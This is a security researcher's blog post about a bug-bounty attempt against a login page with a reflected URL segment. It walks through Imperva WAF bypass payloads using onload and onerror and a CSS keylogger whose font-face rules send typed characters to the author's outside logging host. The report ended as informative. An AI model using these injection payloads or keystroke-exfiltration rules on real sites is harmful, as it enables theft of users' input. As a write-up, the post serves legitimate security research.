---
layout: post
title: "CSS keylogger in action"
date: 2020-01-06
categories: blog
---

A quick round of Google dorking on a private [HackerOne](https://hackerone.com/) program revealed an interesting dynamic segment on a login page.
Inspecting the source, I gladly realized that the 24 character UUID string was being reflected in the DOM header.

`https://notactualwebsite.com/Service/(S(yx3i1snmqozalj5bxudebcga))/Login.aspx`

<!--more-->

![](/assets/posts/3/reflected-uuid.png)

Replacing the above mentioned UUID with `"` looked promising since I could break out of the `src` tag. I spent a good amount of time trying to pop an XSS, but the server was refusing URLs containing characters like `:` & `/`, and notably, it was protected by the Imperva WAF.

I tried some recently discovered Imperva WAF bypasses but without success. I noticed that using DOM events like `onload` I could call functions, and pass parameters using backticks. Functions like `alert` and `prompt` were blacklisted by the WAF.

Eventually, I tried calling functions defined by the native client-side but those attempts also tripped the WAF mechanism.

``https://notactualwebsitecom/Service/(S("%20onload=doOpenModal`evil.io`))/Login.aspx``

![](/assets/posts/3/imperva-waf.png)

I went back to do some more research about DOM events and discovered some interesting things about [onerror](https://developer.mozilla.org/en-US/docs/Web/API/GlobalEventHandlers/onerror):

* "`element.onerror` accepts a function with a single argument of type Event."
* "A good example for this is when you are using an image tag, and need to specify a backup image in case the one you need is not available on the server for any reason."
* `<img src="imagenotfound.gif" onerror="this.onerror=null;this.src='imagefound.gif';" />`"

The `onerror` handler was being called since the path to the file was corrupt. So I could just change the `src` to point to my script... right?

The shortest way was to prepend `//` and serve the file as root document. Something like `//path.to.js`. Using `/` directly was breaking the URL, and the WAF was blocking all attempts at encoding it. After jumping through several hoops I realized I can make use of the second part of the original string which contained a `/` as part of the path. I could assign it to another tag (`id`) and extract it the `/` using `concat`... twice.

WAF bypass
----------
``https://notactualwebsite.com/Service/(J(" type="javascript" onerror="this.src=this.id[2].repeat`2`.concat`js.sequrist.eu`" id="))/Login.aspx``

But this was just not working. I spent a good amount of time playing around with it but the script wouldn't load. I was ready to give up.

CSS keylogger
-------------

Luckily, a `link` tag was also reflecting the payload. And including an external CSS file worked. Not ideal, but I remembered the concept of [CSS keylogger](https://bytescout.com/blog/css-keylogger.html) - which esentially triggers an external request for a bogus font from the attacker's server everytime something is typed inside an input. The URL for the font is crafted to reveal the character as a query parameter.

* @font-face { font-family: x; src: url(//logger.sequrist.eu/log?a), local(Impact); unicode-range: U+61; }
* @font-face { font-family: x; src: url(//logger.sequrist.eu/log?b), local(Impact); unicode-range: U+62; }
* @font-face { font-family: x; src: url(//logger.sequrist.eu/log?c), local(Impact); unicode-range: U+63; }
* @font-face { font-family: x; src: url(//logger.sequrist.eu/log?d), local(Impact); unicode-range: U+64; }
* ...
* input { font-family: x, 'Comic sans ms'; }

Conclusion
----------

![](/assets/posts/3/hackerone-closed-informative.png)

* "Thanks for your report. As you might note, you won't be able to fully exfiltrate the whole user-id as the font is fetched only once per each char. Open your network tab, type abaab and observe only two requests are sent. That said, we're closing this as Informative unless you can prove it's possible to exfiltrate any sensitive info - such as the CSRF token for a logged-in user -. Your effort is nonetheless appreciated and we wish that you'll continue to research and submit any future security issues you find."

This [article](https://www.bram.us/2018/02/21/css-keylogger-and-why-you-shouldnt-worry-about-it/) explains the technical details and why this attack is almost harmless by itself.

Theoretically, this is a cross-site code injection attack. It provides a mechanism for bypassing the same-origin policy which might sound a little scary.
But in reality, it was just a good exercise; a challenging puzzle, better understanding of DOM events and everything brought together elegantly into something concrete.
